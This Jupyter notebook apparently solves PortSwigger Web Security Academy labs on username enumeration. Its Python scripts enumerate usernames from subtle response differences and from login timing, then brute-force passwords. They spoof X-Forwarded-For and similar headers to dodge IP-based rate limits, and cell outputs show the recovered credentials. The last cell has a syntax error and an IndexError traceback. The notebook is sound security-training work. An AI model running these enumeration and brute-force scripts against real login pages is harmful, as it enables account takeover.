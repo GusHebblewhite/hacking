{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "e31af6d8",
   "metadata": {
    "heading_collapsed": true
   },
   "source": [
    "# Different Responses\n",
    "- https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses\n",
    "- https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses\n",
    "\n",
    "Code here is written for the latter but it probably still works on the former. In any case it's very simple."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "id": "237a3b65",
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "import requests\n",
    "from tqdm import tqdm\n",
    "import re"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "id": "a435c16b",
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "URL = \"https://acec1fd41f471d6bc00759460018003f.web-security-academy.net/\"\n",
    "\n",
    "#Load list of usernames and passwords to try\n",
    "file_dir = \"../../../library/text_files/\"\n",
    "with open(file_dir + \"pw_list.txt\", 'r') as f:\n",
    "    passwords = [x.strip() for x in f.readlines()]\n",
    "with open(file_dir + \"uname_list.txt\", 'r') as f:\n",
    "    usernames = [x.strip() for x in f.readlines()]\n",
    "    \n",
    "#Start session\n",
    "s = requests.session()\n",
    "r = s.get(URL)\n",
    "\n",
    "if r.status_code == 504:\n",
    "    print(\"Env has timed out!\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 80,
   "id": "c00a03a6",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "100%|█████████████████████████████████████████████████████████████████████████████████| 101/101 [02:42<00:00,  1.61s/it]\n"
     ]
    }
   ],
   "source": [
    "# Enumerate Usernames\n",
    "\n",
    "response_log_un = {}\n",
    "\n",
    "def get_key(response_text):\n",
    "    #Clean unwanted variablility from response\n",
    "    variable_string = re.findall(r\"analytics\\?id.*/script\", response_text)[0]\n",
    "    key = response_text.replace(variable_string, \"\")\n",
    "    return key, variable_string\n",
    "    \n",
    "\n",
    "for each_uname in tqdm(usernames):\n",
    "    \n",
    "    #payload\n",
    "    data = {'username' : each_uname ,\n",
    "            'password' : 'test'}\n",
    "    \n",
    "    r = s.post(URL + \"login\", data=data)\n",
    "    \n",
    "    #Make sure no timeout\n",
    "    if r.status_code == 504:\n",
    "        print(\"Env has timed out!\")\n",
    "        \n",
    "    key, _ = get_key(r.text)\n",
    "\n",
    "    if key in response_log_un.keys():\n",
    "        response_log_un[key]['cnt'] += 1\n",
    "        response_log_un[key]['uname'].append(each_uname)\n",
    "    else:\n",
    "        response_log_un[key] = {'cnt' : 1, 'uname' : [each_uname, ]}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 83,
   "id": "5d9c660d",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[53, 47, 1]"
      ]
     },
     "execution_count": 83,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "response_cnt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 82,
   "id": "8eb4cd86",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['ae']"
      ]
     },
     "execution_count": 82,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#Take first username\n",
    "response_cnt = [response_log_un[x]['cnt'] for x in response_log_un.keys()]\n",
    "min_cnt = min(response_cnt)\n",
    "valid_uname_arr = [\n",
    "    response_log_un[x]['uname'] for x in response_log_un.keys() if (response_log_un[x]['cnt'] == min_cnt)]\n",
    "valid_uname = valid_uname_arr[0]\n",
    "valid_uname"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 86,
   "id": "527555d1",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "100%|█████████████████████████████████████████████████████████████████████████████████| 100/100 [02:44<00:00,  1.64s/it]\n"
     ]
    }
   ],
   "source": [
    "response_log_pw = {}\n",
    "\n",
    "# Guess passwords\n",
    "for each_pw in tqdm(passwords):\n",
    "    \n",
    "    #payload\n",
    "    data = {'username' : valid_uname,\n",
    "            'password' : each_pw}\n",
    "    \n",
    "    r = requests.post(URL + \"login\", data=data)\n",
    "    \n",
    "    #Make sure no timeout\n",
    "    if r.status_code == 504:\n",
    "        print(\"Env has timed out!\")\n",
    "        \n",
    "    key, _ = get_key(r.text)\n",
    "    \n",
    "    #Check if response is unique\n",
    "    if key in response_log_pw.keys():\n",
    "        response_log_pw[key]['cnt'] += 1\n",
    "        response_log_pw[key]['pw'].append(each_pw)\n",
    "    else:\n",
    "        response_log_pw[key] = {'cnt' : 1, 'pw' : [each_pw, ]}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 87,
   "id": "3a3590ae",
   "metadata": {
    "hidden": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[39, 33, 1, 17, 10]\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "['aaaaaa']"
      ]
     },
     "execution_count": 87,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#Validation\n",
    "print([response_log_pw[x]['cnt'] for x in response_log_pw.keys()])\n",
    "#Print password!\n",
    "min_cnt = min([response_log_pw[x]['cnt'] for x in response_log_pw.keys()])\n",
    "valid_pw_arr = [\n",
    "    response_log_pw[x]['pw'] for x in response_log_pw.keys() if (response_log_pw[x]['cnt'] == min_cnt)]\n",
    "valid_pw = valid_pw_arr[0]\n",
    "valid_pw"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cd3eb8e0",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Yay success.\n",
    "\n",
    "Note that from drilling into the responses the difference was that if the username is correct there is a full stop in the \"Your username or password is incorrect[.]\" text."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "24f3273d",
   "metadata": {},
   "source": [
    "# Timing Attacks\n",
    "https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "49082425",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import tqdm.notebook as tq\n",
    "import matplotlib.pyplot as plt\n",
    "import re"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "c21b8331",
   "metadata": {},
   "outputs": [],
   "source": [
    "URL = \"https://ac481f001e8f4f33c04958e6002c0011.web-security-academy.net/\"\n",
    "\n",
    "#Load list of usernames and passwords to try\n",
    "file_dir = \"../../../library/text_files/\"\n",
    "with open(file_dir + \"pw_list.txt\", 'r') as f:\n",
    "    passwords = [x.strip() for x in f.readlines()]\n",
    "with open(file_dir + \"uname_list.txt\", 'r') as f:\n",
    "    usernames = [x.strip() for x in f.readlines()]\n",
    "\n",
    "s = requests.session()\n",
    "r = s.get(URL)\n",
    "\n",
    "if r.status_code == 504:\n",
    "    print(\"Env time out\")\n",
    "    \n",
    "\n",
    "cookies = s.cookies.get_dict()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "f8dbad93",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e990c03fe5a24cee80908c05a4fd359d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/101 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "responses = []\n",
    "\n",
    "for idx, each_username in enumerate(tq.tqdm(usernames)):\n",
    "    \n",
    "    data = {\"username\" : each_username, \"password\" : \"X\"*200}\n",
    "    \n",
    "    fake_ip = f\"197.0.{2+idx//(256*3)}.{idx//3}\"\n",
    "    #Jumble the session:\n",
    "    headers = {\"X-Originating-IP\": fake_ip,\n",
    "           \"X-Forwarded-For\" : fake_ip,\n",
    "           \"X-Remote-IP\" : fake_ip,\n",
    "           \"X-Remote-Addr\" : fake_ip}\n",
    "    \n",
    "    r = s.post(URL + \"login\", data=data, headers=headers)\n",
    "    \n",
    "    responses.append([each_username, r.elapsed])\n",
    "    \n",
    "    if r.status_code != 200:\n",
    "        print(r.status_code)\n",
    "        \n",
    "    #Check text for notification header\n",
    "    notification = re.findall(r\"<h1>Login</h1>[\\s\\S]*?<p.*?>(.*?)</p>\", r.text)\n",
    "    if notification[0] != \"Invalid username or password.\":\n",
    "        tq.tqdm.write(notification[0])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "bddfa2fb",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<matplotlib.collections.PathCollection at 0x7fef47dcdf70>"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "plt.scatter(range(len(responses)), [x[1].total_seconds() for x in responses])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "63f7508e",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['autodiscover', 'root', 'aix', 'app', 'ad']"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "#Grab the three most likely usernames based on timing\n",
    "likely_usernames = [x[0] for x in sorted(responses, key=lambda x: x[1].total_seconds(), reverse=True)[:5]]\n",
    "likely_usernames"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "3ffd3666",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying username autodiscover\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "87384284722944e892a63f16c0811d02",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/100 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying username root\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "cd8c01f0de7649bfb4fa99bc2a24a5ae",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/100 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying username aix\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "5cccb8227f894aea81f8e77134de3a16",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/100 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "ename": "IndexError",
     "evalue": "list index out of range",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mIndexError\u001b[0m                                Traceback (most recent call last)",
      "\u001b[0;32m/tmp/ipykernel_141/1138914457.py\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m     21\u001b[0m         \u001b[0;31m#Check text for notification header\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     22\u001b[0m         \u001b[0mnotification\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mre\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mfindall\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34mr\"<h1>Login</h1>[\\s\\S]*?<p.*?>(.*?)</p>\"\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mr\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mtext\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 23\u001b[0;31m         \u001b[0;32mif\u001b[0m \u001b[0mnotification\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;36m0\u001b[0m\u001b[0;34m]\u001b[0m \u001b[0;34m!=\u001b[0m \u001b[0;34m\"Invalid username or password.\"\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     24\u001b[0m             \u001b[0mtq\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mtqdm\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mwrite\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mnotification\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;36m0\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     25\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mIndexError\u001b[0m: list index out of range"
     ]
    }
   ],
   "source": [
    "for un_idx, each_username in enumerate(likely_usernames):\n",
    "    print(f\"Trying username {each_username}\")\n",
    "    for pw_idx, each_password in enumerate(tq.tqdm(passwords)):\n",
    "\n",
    "        data = {\"username\" : each_username, \"password\" : each_password}\n",
    "        \n",
    "        idx = un_idx * len(passwords) + pw_idx\n",
    "\n",
    "        fake_ip = f\"197.0.{3+idx//(128*3)}.{(idx//3)%128}\"\n",
    "        #Jumble the session:\n",
    "        headers = {\"X-Originating-IP\": fake_ip,\n",
    "               \"X-Forwarded-For\" : fake_ip,\n",
    "               \"X-Remote-IP\" : fake_ip,\n",
    "               \"X-Remote-Addr\" : fake_ip}\n",
    "\n",
    "        r = s.post(URL + \"login\", data=data, headers=headers)\n",
    "\n",
    "        if r.status_code != 200:\n",
    "            print(r.status_code)\n",
    "\n",
    "        #Check text for notification header\n",
    "        notification = re.findall(r\"<h1>Login</h1>[\\s\\S]*?<p.*?>(.*?)</p>\", r.text)\n",
    "        if notification == []:\n",
    "            print(\"password found!)\n",
    "        if notification[0] != \"Invalid username or password.\":\n",
    "            tq.tqdm.write(notification[0])\n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bc93b137",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
